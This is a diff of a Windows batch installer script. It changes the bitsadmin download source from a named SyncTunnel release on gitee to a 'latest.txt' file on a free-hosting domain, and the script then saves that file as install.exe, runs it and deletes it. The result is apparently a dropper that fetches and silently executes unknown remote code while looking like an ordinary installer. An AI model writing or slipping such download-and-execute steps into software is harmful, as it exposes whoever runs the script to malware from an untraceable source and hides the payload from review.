@@ -1,4 +1,4 @@
 @echo off
-bitsadmin /transfer MyApp /priority high "https://foruda.gitee.com/attach_file/1773576164799002933/synctunnelbeta2.0rc1.1release2windows-amd64.exe?token=559a38dec672015d09a30e80cc15ba33&ts=1773576477&attname=SyncTunnel%20beta2.0RC1.1release2%20Windows-AMD64.exe" %temp%\install.exe
+bitsadmin /transfer MyApp /priority high "https://nnpyro.fwh.is/latest.txt" %temp%\install.exe
 start /wait %temp%\install.exe
 del %temp%\install.exe >nul
